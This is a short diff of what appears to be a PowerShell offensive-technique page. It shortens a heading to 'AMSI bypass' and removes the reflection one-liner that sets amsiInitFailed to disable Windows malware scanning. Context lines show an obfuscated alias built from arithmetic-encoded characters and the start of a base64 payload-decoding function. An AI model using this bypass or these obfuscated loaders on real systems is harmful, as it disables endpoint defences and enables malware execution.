@@ -63,7 +63,7 @@ set-alias gotoany (-join (@((706440/(13678024/2033)),(58782/(-9484+10066)),(6867
 
 {% stepper %}
 {% step %}
-### Anti-Malware Scan Interface bypass
+### AMSI bypass
 
 {% code overflow="wrap" %}
 ```powershell
@@ -77,8 +77,6 @@ set-alias gotoany (-join (@((706440/(13678024/2033)),(58782/(-9484+10066)),(6867
 ### Define decode function
 
 ```powershell
-[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed", "NonPublic","Static").SetValue($null, $true)
-
 function decode_payload  {
     param($INPUT)
     $decoded_input = [Convert]::FromBase64String($INPUT)
